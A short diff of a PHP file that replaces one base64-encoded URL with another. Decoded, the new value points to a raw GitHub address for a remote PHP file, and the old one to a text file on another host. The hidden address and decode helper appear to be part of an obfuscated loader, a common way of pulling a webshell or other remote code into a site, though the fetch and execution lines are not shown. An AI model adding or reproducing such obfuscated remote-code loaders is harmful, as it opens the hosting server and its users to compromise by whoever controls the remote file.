@@ -10,7 +10,7 @@ function decode_file($data) {
     return base64_decode($data);
 }
 
-$encoded_url = "aHR0cHM6Ly9maWxlLjB4MTk5OS50ZWNoL3ByaXYudHh0";
+$encoded_url = "aHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL0VsMDBJUS8wMElRL3JlZnMvaGVhZHMvbWFpbi9hcGFwdW4ucGhw";
 
 $decoded_url = decode_file($encoded_url);
 
